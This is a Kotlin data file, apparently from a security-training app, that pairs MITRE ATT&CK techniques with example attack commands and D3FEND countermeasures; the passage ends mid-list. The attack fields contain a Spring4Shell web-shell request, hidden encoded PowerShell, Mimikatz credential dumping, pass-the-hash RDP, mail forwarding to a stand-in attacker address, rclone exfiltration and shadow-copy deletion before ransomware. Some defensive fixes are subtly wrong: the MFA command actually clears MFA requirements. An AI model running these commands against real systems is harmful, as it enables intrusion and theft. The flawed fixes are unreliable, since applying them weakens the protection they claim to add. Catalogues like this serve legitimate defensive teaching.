package com.example.data.mitre

import androidx.compose.ui.graphics.Color
import com.example.ui.theme.CyberCyan
import com.example.ui.theme.CyberEmerald
import com.example.ui.theme.SeverityCritical
import com.example.ui.theme.SeverityHigh
import com.example.ui.theme.SeverityMedium

/**
 * The 14 official MITRE ATT&CK Enterprise Tactics.
 */
enum class MitreTactic(
    val displayName: String,
    val tacticId: String,
    val color: Color,
    val description: String
) {
    RECONNAISSANCE("Reconnaissance", "TA0043", Color(0xFF06B6D4), "Gather information to plan future adversary operations"),
    RESOURCE_DEVELOPMENT("Resource Development", "TA0042", Color(0xFF14B8A6), "Establish resources to support operations (infrastructure, accounts, tools)"),
    INITIAL_ACCESS("Initial Access", "TA0001", SeverityCritical, "Techniques used to gain an initial foothold within a network"),
    EXECUTION("Execution", "TA0002", SeverityHigh, "Techniques that result in adversary-controlled code running on a system"),
    PERSISTENCE("Persistence", "TA0003", Color(0xFFA855F7), "Maintain access across system restarts and credential changes"),
    PRIVILEGE_ESCALATION("Privilege Escalation", "TA0004", SeverityCritical, "Gain higher-level permissions (SYSTEM, root, Domain Admin)"),
    DEFENSE_EVASION("Defense Evasion", "TA0005", Color(0xFFF97316), "Avoid detection by security personnel, EDR and logging tools"),
    CREDENTIAL_ACCESS("Credential Access", "TA0006", SeverityCritical, "Steal passwords, tokens, hashes and certificates"),
    DISCOVERY("Discovery", "TA0007", CyberCyan, "Observe system configuration, network topology and environment"),
    LATERAL_MOVEMENT("Lateral Movement", "TA0008", Color(0xFFEAB308), "Access and control remote systems on the enterprise network"),
    COLLECTION("Collection", "TA0009", Color(0xFF8B5CF6), "Gather data of interest to fulfill adversary objectives"),
    COMMAND_AND_CONTROL("Command & Control", "TA0011", Color(0xFF38BDF8), "Communicate with compromised systems to control them"),
    EXFILTRATION("Exfiltration", "TA0010", Color(0xFFEC4899), "Steal data from target network to adversary storage"),
    IMPACT("Impact", "TA0040", SeverityCritical, "Disrupt availability or destroy integrity of systems and data")
}

/**
 * The 6 official MITRE D3FEND Tactics (Defensive Matrix Categories).
 */
enum class MitreDefendTactic(
    val displayName: String,
    val tacticId: String,
    val color: Color,
    val description: String
) {
    MODEL("Model", "D3-TACTIC-MODEL", Color(0xFF06B6D4), "Model and map enterprise assets, network topology, software components, and data flows"),
    HARDEN("Harden", "D3-TACTIC-HARDEN", Color(0xFF10B981), "Harden application configurations, credential stores, system platforms, and communications"),
    DETECT("Detect", "D3-TACTIC-DETECT", Color(0xFFF59E0B), "Detect adversary activity through process, network, file, identifier, and behavioral analysis"),
    ISOLATE("Isolate", "D3-TACTIC-ISOLATE", Color(0xFF8B5CF6), "Isolate execution environments, network segments, and security tokens to constrain movement"),
    DECEIVE("Deceive", "D3-TACTIC-DECEIVE", Color(0xFFEC4899), "Deploy decoy environments, honeytokens, canary credentials, and false artifacts to mislead adversaries"),
    EVICT("Evict", "D3-TACTIC-EVICT", Color(0xFFEF4444), "Evict adversaries by terminating malicious processes, revoking credentials, and isolating network sessions")
}

data class MitreTtpItem(
    val techniqueId: String,
    val name: String,
    val tactic: MitreTactic,
    val subTechnique: String? = null,
    val description: String,
    val attackExampleTitle: String,
    val attackCodeCommand: String,
    val d3fendId: String,
    val d3fendName: String,
    val d3fendDescription: String,
    val d3fendRuleOrFix: String,
    val knownAptGroups: List<String>,
    val tags: List<String>
)

data class MitreD3fendItem(
    val d3fendId: String,
    val name: String,
    val tactic: MitreDefendTactic,
    val description: String,
    val ruleOrFix: String,
    val counteredAttackIds: List<String>,
    val tags: List<String>
)

object MitreMatrixRepository {

    val allTtps: List<MitreTtpItem> = listOf(
        // ==================== 1. RECONNAISSANCE (TA0043) ====================
        MitreTtpItem(
            techniqueId = "T1595.002",
            name = "Active Scanning: Vulnerability Scanning",
            tactic = MitreTactic.RECONNAISSANCE,
            subTechnique = "T1595.002",
            description = "Adversaries execute automated vulnerability scans against public IP subnets and web applications to discover unpatched edge servers and exposed endpoints.",
            attackExampleTitle = "Mass Scan for Exposed Git Repositories and CVEs via Nuclei",
            attackCodeCommand = """
# Scanning perimeter IP range for exposed .git folders and Spring4Shell
nuclei -u https://target-corp.com/ -t cves/ -t exposures/ -severity critical,high
nmap -sV -sC -p 443,8443,8080 --script ssl-heartbleed,http-vuln* 198.51.100.0/24
            """.trimIndent(),
            d3fendId = "D3-NTA",
            d3fendName = "Network Traffic Pattern Analysis & Rate Limiting",
            d3fendDescription = "Deploy cloud Edge WAFs with dynamic rate limiting and behavioral bot detection to throttle and block automated scanner fingerprints.",
            d3fendRuleOrFix = """
# AWS WAF Rate-Based Rule: Block IPs making > 100 requests per 5 minutes
{
  "Name": "BlockScannerBursts",
  "Priority": 1,
  "Action": { "Block": {} },
  "Statement": {
    "RateBasedStatement": { "Limit": 100, "AggregateKeyType": "IP" }
  }
}
            """.trimIndent(),
            knownAptGroups = listOf("Volt Typhoon", "Lazarus Group", "APT41"),
            tags = listOf("Reconnaissance", "Scanning", "Nuclei", "Nmap", "WAF")
        ),
        MitreTtpItem(
            techniqueId = "T1596.001",
            name = "Search Open Technical Databases: DNS Records",
            tactic = MitreTactic.RECONNAISSANCE,
            subTechnique = "T1596.001",
            description = "Adversaries query public DNS zone records, Certificate Transparency logs, and Passive DNS caches to enumerate corporate subdomains and cloud tenants.",
            attackExampleTitle = "Subdomain Enumeration via Certificate Transparency Logs",
            attackCodeCommand = """
# Query crt.sh CT logs via curl to map all wildcard subdomains
curl -s "https://crt.sh/?q=%25.corp.internal&output=json" | \
  jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u
            """.trimIndent(),
            d3fendId = "D3-DNSR",
            d3fendName = "DNS Request Analysis & Split-Horizon DNS",
            d3fendDescription = "Implement split-horizon DNS so internal infrastructure domain names are never published to public Certificate Transparency logs or external DNS servers.",
            d3fendRuleOrFix = """
# Cloudflare / Route53 DNSSEC & Private Zone Enforce
aws route53 create-vpc-association-authorization \
  --hosted-zone-id Z12345678 --vpc VPCRegion=us-east-1,VPCId=vpc-98765432
            """.trimIndent(),
            knownAptGroups = listOf("APT29 (Nobelium)", "FIN7", "Kimsuky"),
            tags = listOf("Reconnaissance", "DNS", "Certificate Transparency", "OSINT")
        ),

        // ==================== 2. RESOURCE DEVELOPMENT (TA0042) ====================
        MitreTtpItem(
            techniqueId = "T1588.002",
            name = "Obtain Capabilities: Tool",
            tactic = MitreTactic.RESOURCE_DEVELOPMENT,
            subTechnique = "T1588.002",
            description = "Adversaries acquire offensive utility toolsets, commercial software licenses (Cobalt Strike), and open-source post-exploitation frameworks (Sliver, Mythic, Mimikatz).",
            attackExampleTitle = "Procuring and Compiling Custom Sliver C2 Binary",
            attackCodeCommand = """
# Adversary clones and compiles cross-platform C2 server
git clone https://github.com/BishopFox/sliver.git
cd sliver && make
./sliver-server --daemon
./sliver generate --http c2-domain.com --os windows --arch amd64
            """.trimIndent(),
            d3fendId = "D3-EAL",
            d3fendName = "Software Feature Invalidation & Binary Hash Deny-List",
            d3fendDescription = "Maintain enterprise Application Control (AppLocker, Windows Defender Application Control WDAC) to prevent execution of unapproved offensive binaries.",
            d3fendRuleOrFix = """
# WDAC PowerShell Policy: Block unapproved C2 binaries by hash & certificate
New-CIPolicy -Level Publisher -FilePath "C:\Rules\WDAC.xml" -UserPEs
Set-RuleOption -FilePath "C:\Rules\WDAC.xml" -Option 3
            """.trimIndent(),
            knownAptGroups = listOf("BlackCat/ALPHV", "LockBit", "Scattered Spider"),
            tags = listOf("Resource Development", "C2", "WDAC", "AppLocker")
        ),
        MitreTtpItem(
            techniqueId = "T1584.004",
            name = "Compromise Infrastructure: Server",
            tactic = MitreTactic.RESOURCE_DEVELOPMENT,
            subTechnique = "T1584.004",
            description = "Adversaries compromise legitimate third-party web servers, VPS instances, or cloud containers to use as redirectors and operational relay nodes.",
            attackExampleTitle = "Deploying Apache mod_rewrite HTTP Reverse Proxy Redirector",
            attackCodeCommand = """
# Setup transparent C2 reverse redirector filtering non-victim IPs
RewriteEngine On
RewriteCond %{HTTP_USER_AGENT} ^Mozilla.* [NC]
RewriteRule ^/beacon$ http://actual-c2-backend.internal:8080/beacon [P]
            """.trimIndent(),
            d3fendId = "D3-NTA",
            d3fendName = "Threat Intelligence Verification & IP Reputation Feeds",
            d3fendDescription = "Continuously cross-reference outbound edge firewall sessions with high-frequency threat intelligence feeds and newly registered domain (NRD) lists.",
            d3fendRuleOrFix = """
# Palo Alto EDL (External Dynamic List) configuration:
Set deviceconfig system external-list "Newly-Registered-Domains" url "https://edl.intel.org/nrd"
            """.trimIndent(),
            knownAptGroups = listOf("APT28 (Fancy Bear)", "Turla", "MuddyWater"),
            tags = listOf("Resource Development", "Redirector", "C2", "Proxy")
        ),

        // ==================== 3. INITIAL ACCESS (TA0001) ====================
        MitreTtpItem(
            techniqueId = "T1190",
            name = "Exploit Public-Facing Application",
            tactic = MitreTactic.INITIAL_ACCESS,
            description = "Adversaries exploit software vulnerabilities (RCE, SQLi, SSRF) in public internet-facing web applications, VPN gateways, or remote access infrastructure.",
            attackExampleTitle = "Spring4Shell RCE (CVE-2022-22965) Remote Command Injection",
            attackCodeCommand = """
# Exploit Spring Framework ClassLoader Data Binding
curl -X POST "https://target.com/helloworld" \
  -H "class.module.classLoader.resources.context.parent.pipeline.first.pattern: %{c2}i" \
  -H "c2: <% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"
            """.trimIndent(),
            d3fendId = "D3-EAL",
            d3fendName = "Application Hardening & Web Application Firewall",
            d3fendDescription = "Deploy cloud Edge WAFs with dynamic rule signatures and strict input validation schemas.",
            d3fendRuleOrFix = """
# ModSecurity WAF Rule: Block ClassLoader parameter tampering
SecRule REQUEST_BODY|REQUEST_HEADERS "class\.module\.classLoader" \
  "id:1000001,phase:2,deny,status:403,log,msg:'Spring4Shell Attempt'"
            """.trimIndent(),
            knownAptGroups = listOf("Volt Typhoon", "Lazarus Group", "APT41"),
            tags = listOf("Initial Access", "RCE", "Spring4Shell", "WAF")
        ),
        MitreTtpItem(
            techniqueId = "T1566.001",
            name = "Phishing: Spearphishing Attachment",
            tactic = MitreTactic.INITIAL_ACCESS,
            subTechnique = "T1566.001",
            description = "Adversaries send targeted emails containing malicious file attachments (Office macros, ISO files, LNK shortcuts) to compromise internal user workstations.",
            attackExampleTitle = "LNK Shortcut File Dropping Malicious DLL Payload",
            attackCodeCommand = """
# Malicious LNK payload invocation string inside email attachment
cmd.exe /c start /min powershell.exe -NOP -W Hidden -e JABjAGwAaQBlAG4AdAA...
            """.trimIndent(),
            d3fendId = "D3-EBR",
            d3fendName = "Message Hardening & Attachment Sandboxing",
            d3fendDescription = "Filter incoming email attachments using dynamic detonators, block dangerous extension types (LNK, HTA, ISO), and strip active macros.",
            d3fendRuleOrFix = """
# Exchange Online Protection (EOP) PowerShell Transport Rule
New-TransportRule -Name "Block Dangerous Attachments" \
  -AttachmentHasExecutableContent ${'$'}true -BlockMessage ${'$'}true
            """.trimIndent(),
            knownAptGroups = listOf("APT29", "FIN7", "Wizard Spider"),
            tags = listOf("Initial Access", "Phishing", "LNK", "EOP")
        ),

        // ==================== 4. EXECUTION (TA0002) ====================
        MitreTtpItem(
            techniqueId = "T1059.001",
            name = "Command & Scripting Interpreter: PowerShell",
            tactic = MitreTactic.EXECUTION,
            subTechnique = "T1059.001",
            description = "Adversaries abuse PowerShell command-line interfaces to execute obfuscated in-memory scripts, invoke Win32 API functions, and bypass disk-based antivirus.",
            attackExampleTitle = "Obfuscated Encoded PowerShell Memory Execution",
            attackCodeCommand = """
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQ...
            """.trimIndent(),
            d3fendId = "D3-PSA",
            d3fendName = "Process Segment Analysis & AMSI Logging Enforce",
            d3fendDescription = "Enforce PowerShell Constrained Language Mode, activate ScriptBlock Logging (Event ID 4104), and integrate AMSI with Endpoint Detection & Response (EDR).",
            d3fendRuleOrFix = """
# Enable ScriptBlock Logging & Constrained Language Mode via GPO Registry
reg add "HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 1 /f
[Environment]::SetEnvironmentVariable("__PSLockdownPolicy", "4", "Machine")
            """.trimIndent(),
            knownAptGroups = listOf("FIN7", "MuddyWater", "APT33"),
            tags = listOf("Execution", "PowerShell", "AMSI", "Event ID 4104")
        ),

        // ==================== 5. PERSISTENCE (TA0003) ====================
        MitreTtpItem(
            techniqueId = "T1547.001",
            name = "Boot or Logon Autostart Execution: Registry Run Keys",
            tactic = MitreTactic.PERSISTENCE,
            subTechnique = "T1547.001",
            description = "Adversaries modify Windows Registry Run keys or Startup folders to automatically execute malicious payloads upon user logon or system boot.",
            attackExampleTitle = "Adding Malicious DLL Autostart Persistence in Registry",
            attackCodeCommand = """
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "UpdateCheck" /t REG_SZ /d "C:\Users\Public\payload.exe" /f
            """.trimIndent(),
            d3fendId = "D3-PSA",
            d3fendName = "System Registry Monitoring & Autoruns Lockout",
            d3fendDescription = "Deploy EDR behavioral rules to block unauthorized non-SYSTEM writes to Windows Registry autostart keys.",
            d3fendRuleOrFix = """
# Sysmon Config XML: Monitor HKCU and HKLM Run Keys
<RegistryGroup func="include">
  <TargetObject name="RegistryRunKey" condition="contains">\CurrentVersion\Run</TargetObject>
</RegistryGroup>
            """.trimIndent(),
            knownAptGroups = listOf("APT28", "Lazarus Group", "Turla"),
            tags = listOf("Persistence", "Registry", "Sysmon", "Autoruns")
        ),

        // ==================== 6. PRIVILEGE ESCALATION (TA0004) ====================
        MitreTtpItem(
            techniqueId = "T1068",
            name = "Exploitation for Privilege Escalation",
            tactic = MitreTactic.PRIVILEGE_ESCALATION,
            description = "Adversaries exploit kernel or service software vulnerabilities (e.g., PrintNightmare, DirtyPipe) to escalate from standard user privileges to SYSTEM or root.",
            attackExampleTitle = "Exploiting Windows Kernel CVE-2023-21768 (AFD.sys LPE)",
            attackCodeCommand = """
# Elevating standard user cmd prompt to NT AUTHORITY\SYSTEM
cve-2023-21768.exe
whoami # Outputs: nt authority\system
            """.trimIndent(),
            d3fendId = "D3-SH",
            d3fendName = "System Hardening & Vulnerability Remediation",
            d3fendDescription = "Enforce automated kernel patch management and apply Attack Surface Reduction (ASR) rules to prevent vulnerable driver loading.",
            d3fendRuleOrFix = """
# PowerShell ASR Rule: Block abuse of exploited vulnerable drivers
Set-MpPreference -AttackSurfaceReductionRules_Ids 5beb8efe-19a9-4276-8380-423e97086ec1 -AttackSurfaceReductionRules_Actions Enabled
            """.trimIndent(),
            knownAptGroups = listOf("BlackBasta", "LockBit", "Kimsuky"),
            tags = listOf("Privilege Escalation", "Kernel", "ASR", "Patching")
        ),

        // ==================== 7. DEFENSE EVASION (TA0005) ====================
        MitreTtpItem(
            techniqueId = "T1027",
            name = "Obfuscated Files or Information",
            tactic = MitreTactic.DEFENSE_EVASION,
            description = "Adversaries encode, encrypt, or compress executable binaries, scripts, and payloads to evade signature-based Antivirus detection.",
            attackExampleTitle = "XOR Encoded Payload Dropper with Dynamic API Resolution",
            attackCodeCommand = """
# Python script to XOR-encode malicious shellcode with dynamic key
python3 -c 'key=0x5A; payload=open("shell.bin","rb").read(); open("enc.bin","wb").write(bytes([b^key for b in payload]))'
            """.trimIndent(),
            d3fendId = "D3-PSA",
            d3fendName = "Process Memory Analysis & Heuristic Emulation",
            d3fendDescription = "Enable EDR heuristic memory scanning to detect unmapped memory allocation, XOR decryption loops, and process hollowing.",
            d3fendRuleOrFix = """
# YARA Rule: Detect XOR Obfuscated Windows Shellcode Loops
rule Detect_XOR_Shellcode {
    strings:
        ${'$'}xor_loop = { 80 34 ?? ?? 40 49 75 F7 }
    condition:
        ${'$'}xor_loop in (0..1024)
}
            """.trimIndent(),
            knownAptGroups = listOf("APT29", "Scattered Spider", "Sandworm"),
            tags = listOf("Defense Evasion", "Obfuscation", "YARA", "EDR")
        ),

        // ==================== 8. CREDENTIAL ACCESS (TA0006) ====================
        MitreTtpItem(
            techniqueId = "T1003.001",
            name = "OS Credential Dumping: LSASS Memory",
            tactic = MitreTactic.CREDENTIAL_ACCESS,
            subTechnique = "T1003.001",
            description = "Adversaries dump process memory of the Local Security Authority Subsystem Service (LSASS) to harvest plaintext passwords, NTLM hashes, and Kerberos tickets.",
            attackExampleTitle = "Mimikatz LSASS Process Memory Dump",
            attackCodeCommand = """
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
            """.trimIndent(),
            d3fendId = "D3-CH",
            d3fendName = "Credential Hardening & LSASS Protected Process Light (PPL)",
            d3fendDescription = "Enable LSA Protection (RunAsPPL) and Microsoft Defender Credential Guard to isolate LSASS secrets in a Virtualization-Based Security (VBS) container.",
            d3fendRuleOrFix = """
# Enable LSASS PPL and Credential Guard via Registry
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LsaCfgFlags /t REG_DWORD /d 1 /f
            """.trimIndent(),
            knownAptGroups = listOf("Wizard Spider", "Lazarus Group", "FIN7"),
            tags = listOf("Credential Access", "LSASS", "Mimikatz", "Credential Guard")
        ),

        // ==================== 9. DISCOVERY (TA0007) ====================
        MitreTtpItem(
            techniqueId = "T1087.002",
            name = "Account Discovery: Domain Account",
            tactic = MitreTactic.DISCOVERY,
            subTechnique = "T1087.002",
            description = "Adversaries query Active Directory LDAP interfaces or native net utilities to map domain user accounts, privileged admin groups, and enterprise domain architecture.",
            attackExampleTitle = "Active Directory Domain Admin Enumeration via PowerView",
            attackCodeCommand = """
# Querying Domain Admins and sensitive Service Principal Names (SPNs)
Get-NetGroupMember -GroupName "Domain Admins" -FullData
Get-NetUser -SPN | Select-Object samaccountname, serviceprincipalname
            """.trimIndent(),
            d3fendId = "D3-DE",
            d3fendName = "Decoy Environment & Honeytoken Account Auditing",
            d3fendDescription = "Deploy decoy Active Directory accounts with canary credentials that trigger immediate high-severity SIEM alerts upon any LDAP enumeration query.",
            d3fendRuleOrFix = """
# Defender for Identity / SIEM Detection for LDAP Mass Queries
event.code: 4662 and object.type: "user" and user.name: "HoneyUserAdmin"
            """.trimIndent(),
            knownAptGroups = listOf("APT29", "FIN7", "Scattered Spider"),
            tags = listOf("Discovery", "Active Directory", "PowerView", "LDAP")
        ),

        // ==================== 10. LATERAL MOVEMENT (TA0008) ====================
        MitreTtpItem(
            techniqueId = "T1021.001",
            name = "Remote Services: Remote Desktop Protocol (RDP)",
            tactic = MitreTactic.LATERAL_MOVEMENT,
            subTechnique = "T1021.001",
            description = "Adversaries abuse valid stolen credentials to connect via RDP to remote internal servers and pivot across workstations.",
            attackExampleTitle = "Automated RDP Session Pivoting via xfreerdp with Saved Hashes",
            attackCodeCommand = """
xfreerdp /v:10.0.1.50 /u:Administrator /pth:32b872d2fb46c2eee7714220b4109f52
            """.trimIndent(),
            d3fendId = "D3-DNSI",
            d3fendName = "Dynamic Network Segment Isolation & Host Firewall Lockdown",
            d3fendDescription = "Enforce Zero Trust microsegmentation, restricting RDP port 3389 exclusively to authenticated Privileged Access Workstations (PAWs).",
            d3fendRuleOrFix = """
# Windows Defender Firewall Rule: Restrict RDP port 3389 to PAW Subnet
New-NetFirewallRule -Name "Restrict-RDP-PAW" -DisplayName "PAW Only RDP" \
  -Direction Inbound -Protocol TCP -LocalPort 3389 -RemoteAddress 10.0.100.0/24 -Action Allow
            """.trimIndent(),
            knownAptGroups = listOf("BlackBasta", "LockBit", "Lazarus Group"),
            tags = listOf("Lateral Movement", "RDP", "Pass-The-Hash", "Firewall")
        ),

        // ==================== 11. COLLECTION (TA0009) ====================
        MitreTtpItem(
            techniqueId = "T1114.002",
            name = "Email Collection: Email Forwarding Rule",
            tactic = MitreTactic.COLLECTION,
            subTechnique = "T1114.002",
            description = "Adversaries create stealthy inbox forwarding rules in Microsoft 365 or Exchange to automatically mirror sensitive corporate emails to external attacker addresses.",
            attackExampleTitle = "Creating Hidden Outlook Inbox Rule via PowerShell / Exchange API",
            attackCodeCommand = """
New-InboxRule -Name "Invoice Forwarding" -User "cfo@company.com" \
  -ForwardTo "exfil@attacker-domain.org" -DeleteMessage ${'$'}false
            """.trimIndent(),
            d3fendId = "D3-UBA",
            d3fendName = "User Behavior Analytics & Mail Flow Monitoring",
            d3fendDescription = "Block external inbox forwarding rules globally in M365 tenant settings and alert on rule additions.",
            d3fendRuleOrFix = """
# Exchange Online PowerShell: Disable Auto-Forwarding to External Domains
Set-HostedOutboundSpamFilterPolicy -Identity Default \
  -AutoForwardingMode Disable
            """.trimIndent(),
            knownAptGroups = listOf("Lapsus$", "Scattered Spider", "Kimsuky"),
            tags = listOf("Collection", "Email", "M365", "Exchange")
        ),

        // ==================== 12. COMMAND & CONTROL (TA0011) ====================
        MitreTtpItem(
            techniqueId = "T1071.001",
            name = "Application Layer Protocol: Web Protocols (HTTP/S C2)",
            tactic = MitreTactic.COMMAND_AND_CONTROL,
            subTechnique = "T1071.001",
            description = "Adversaries communicate with compromised implants using standard HTTP/HTTPS POST requests disguised as normal web browsing traffic to blend with corporate traffic.",
            attackExampleTitle = "Sliver C2 HTTPS Beaconing with Malleable HTTP Profiles",
            attackCodeCommand = """
# Sliver HTTPS C2 beacon configuration string
./sliver generate --http c2-cdn.cloudfront.net:443 --reconnect 10s --jitter 30s
            """.trimIndent(),
            d3fendId = "D3-NTA",
            d3fendName = "Network Traffic Analysis & SSL/TLS Inspection",
            d3fendDescription = "Deploy SSL/TLS deep packet inspection on edge proxies to inspect C2 HTTP payloads, dynamic headers, and anomalous user-agents.",
            d3fendRuleOrFix = """
# Suricata Intrusion Detection Signature for Sliver C2
alert http ${'$'}HOME_NET any -> ${'$'}EXTERNAL_NET any (msg:"Sliver C2 HTTP Beacon Detected"; content:"POST"; http_method; content:"/api/v1/telemetry"; http_uri; sid:1000021;)
            """.trimIndent(),
            knownAptGroups = listOf("APT29", "Cobalt Group", "FIN7"),
            tags = listOf("Command & Control", "HTTP", "HTTPS", "Suricata")
        ),

        // ==================== 13. EXFILTRATION (TA0010) ====================
        MitreTtpItem(
            techniqueId = "T1567.002",
            name = "Exfiltration Over Web Service: Cloud Storage",
            tactic = MitreTactic.EXFILTRATION,
            subTechnique = "T1567.002",
            description = "Adversaries exfiltrate stolen database backups and corporate documents to public cloud storage providers (Rclone to Mega.nz, AWS S3, Google Drive).",
            attackExampleTitle = "Automated Compressed Data Exfiltration via Rclone to Mega",
            attackCodeCommand = """
rclone copy "C:\StagedData\company_secrets.7z" MegaRemote:ExfilBucket --transfers 8 --bwlimit 10M
            """.trimIndent(),
            d3fendId = "D3-NTA",
            d3fendName = "Data Loss Prevention (DLP) & Cloud Access Security Broker",
            d3fendDescription = "Enforce CASB / SWG policies blocking unauthorized personal cloud storage uploads and alert on high-volume outbound data transfers.",
            d3fendRuleOrFix = """
# Zscaler SWG Policy: Block Web Storage & File Transfer Category for Rclone user-agents
Rule: Block Cloud Storage Uploads | Category: Cloud Storage | Action: Block
            """.trimIndent(),
            knownAptGroups = listOf("LockBit", "BlackCat/ALPHV", "Akira"),
            tags = listOf("Exfiltration", "Rclone", "CASB", "DLP")
        ),

        // ==================== 14. IMPACT (TA0040) ====================
        MitreTtpItem(
            techniqueId = "T1486",
            name = "Data Encrypted for Impact (Ransomware)",
            tactic = MitreTactic.IMPACT,
            description = "Adversaries encrypt sensitive files on target endpoints and file shares using asymmetric encryption, rendering them inaccessible to extort ransom payments.",
            attackExampleTitle = "High-Speed Multi-Threaded File Encryption",
            attackCodeCommand = """
taskkill /F /IM sqlservr.exe /IM backup.exe
vssadmin.exe delete shadows /all /quiet
ransom_payload.exe --threads 16 --dir "C:\Data"
            """.trimIndent(),
            d3fendId = "D3-IRP",
            d3fendName = "Immutable Remote Backups & Ransomware Defense",
            d3fendDescription = "Maintain write-once-read-many (WORM) offline backups and configure canary files with automated endpoint isolation upon mass write spikes.",
            d3fendRuleOrFix = """
# Canary file watcher script in PowerShell
${'$'}watcher = New-Object System.IO.FileSystemWatcher
${'$'}watcher.Path = "C:\CanaryShare"
${'$'}watcher.Filter = "*canary*"
Register-ObjectEvent ${'$'}watcher "Changed" -Action {
  Write-Warning "CRITICAL: Canary file altered! Initiating network isolation!"
  Stop-Computer -Force
}
            """.trimIndent(),
            knownAptGroups = listOf("LockBit 4.0", "Akira", "BlackCat/ALPHV"),
            tags = listOf("Impact", "Ransomware", "Canary", "Encryption")
        ),
        MitreTtpItem(
            techniqueId = "T1489",
            name = "Service Stop: Inhibiting System Recovery",
            tactic = MitreTactic.IMPACT,
            description = "Adversaries stop or disable system services, such as Volume Shadow Copy, database engines, and antivirus, to prevent recovery or maximum disruption.",
            attackExampleTitle = "Stopping Hyper-V and MSSQL Services via net stop",
            attackCodeCommand = """
net stop vmms /y
net stop MSSQLSERVER /y
net stop VeeamBackupSvc /y
            """.trimIndent(),
            d3fendId = "D3-PT",
            d3fendName = "Service Protection & Anti-Tamper Isolation",
            d3fendDescription = "Lock critical service permissions using SC sdset so standard administrator accounts cannot stop essential backup and hypervisor processes.",
            d3fendRuleOrFix = """
sc.exe sdset "VeeamBackupSvc" "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)"
            """.trimIndent(),
            knownAptGroups = listOf("Ryuk", "BlackBasta", "Medusa"),
            tags = listOf("Impact", "Service Stop", "Ransomware", "Backups")
        )
    )

    /**
     * Dedicated collection of authentic MITRE D3FEND defensive techniques categorized under the 6 D3FEND tactics.
     */
    val allD3fendItems: List<MitreD3fendItem> = listOf(
        // ==================== 1. MODEL ====================
        MitreD3fendItem(
            d3fendId = "D3-AM",
            name = "Asset Mapping & Cloud Discovery",
            tactic = MitreDefendTactic.MODEL,
            description = "Continuously catalog on-premise hardware, virtual machines, container workloads, and public cloud tenant resources to eliminate shadow IT.",
            ruleOrFix = "aws configservice put-configuration-aggregator --configuration-aggregator-name CorpAggregator",
            counteredAttackIds = listOf("T1595.002", "T1584.004"),
            tags = listOf("Model", "Asset Mapping", "Cloud", "Inventory")
        ),
        MitreD3fendItem(
            d3fendId = "D3-DNSR",
            name = "DNS Record Analysis & Split-Horizon DNS",
            tactic = MitreDefendTactic.MODEL,
            description = "Audit external DNS zones and Certificate Transparency logs while enforcing split-horizon DNS for non-public internal services.",
            ruleOrFix = "aws route53 create-vpc-association-authorization --hosted-zone-id Z12345678 --vpc VPCRegion=us-east-1,VPCId=vpc-98765432",
            counteredAttackIds = listOf("T1596.001"),
            tags = listOf("Model", "DNS", "Certificate Transparency", "Split-Horizon")
        ),

        // ==================== 2. HARDEN ====================
        MitreD3fendItem(
            d3fendId = "D3-EAL",
            name = "Executable Allowed Listing (AppLocker / WDAC)",
            tactic = MitreDefendTactic.HARDEN,
            description = "Enforce cryptographic publisher and hash allow-lists via Windows Defender Application Control to block unapproved binaries and C2 implants.",
            ruleOrFix = "New-CIPolicy -Level Publisher -FilePath 'C:\\Rules\\WDAC.xml' -UserPEs",
            counteredAttackIds = listOf("T1588.002", "T1190"),
            tags = listOf("Harden", "AppLocker", "WDAC", "Application Control")
        ),
        MitreD3fendItem(
            d3fendId = "D3-MFA",
            name = "Multi-Factor Authentication & FIDO2 Passkeys",
            tactic = MitreDefendTactic.HARDEN,
            description = "Mandate phishing-resistant FIDO2 hardware passkeys for all enterprise VPNs, M365 tenants, and single sign-on (SSO) gateways.",
            ruleOrFix = "Set-MsolUser -UserPrincipalName 'admin@company.com' -StrongAuthenticationRequirements @()",
            counteredAttackIds = listOf("T1566.001", "T1021.001"),
            tags = listOf("Harden", "MFA", "FIDO2", "Passkeys", "SSO")
        ),
        MitreD3fendItem(
            d3fendId = "D3-CH",
            name = "Credential Hardening & LSASS RunAsPPL",
            tactic = MitreDefendTactic.HARDEN,
            description = "Protect LSASS process memory with Virtualization-Based Security (VBS) and enable Credential Guard to prevent memory dumping.",
            ruleOrFix = "reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa' /v RunAsPPL /t REG_DWORD /d 1 /f",
            counteredAttackIds = listOf("T1003.001"),
            tags = listOf("Harden", "LSASS", "PPL", "Credential Guard")
        ),
        MitreD3fendItem(
            d3fendId = "D3-SH",
            name = "System Hardening & Vulnerability Patching",
            tactic = MitreDefendTactic.HARDEN,
            description = "Remediate kernel and hypervisor vulnerabilities through automated patch orchestration and Attack Surface Reduction (ASR) policies.",
            ruleOrFix = "Set-MpPreference -AttackSurfaceReductionRules_Ids 5beb8efe-19a9-4276-8380-423e97086ec1 -AttackSurfaceReductionRules_Actions Enabled",
            counteredAttackIds = listOf("T1068"),
            tags = listOf("Harden", "ASR", "Kernel", "Patching")
        ),

        // ==================== 3. DETECT ====================
        MitreD3fendItem(
            d3fendId = "D3-PSA",
            name = "Process Segment Analysis & AMSI Inspection",
            tactic = MitreDefendTactic.DETECT,
            description = "Monitor process execution trees, AMSI script invocations, and DLL injection events using EDR and Sysmon event telemetry.",
            ruleOrFix = "[Environment]::SetEnvironmentVariable('__PSLockdownPolicy', '4', 'Machine')",
            counteredAttackIds = listOf("T1059.001", "T1547.001", "T1027"),
            tags = listOf("Detect", "EDR", "AMSI", "Sysmon", "PowerShell")
        ),
        MitreD3fendItem(
            d3fendId = "D3-NTA",
            name = "Network Traffic Analysis & TLS Inspection",
            tactic = MitreDefendTactic.DETECT,
            description = "Inspect encrypted outbound network traffic, WAF requests, and proxy sessions to detect C2 beacons, port scans, and exfiltration bursts.",
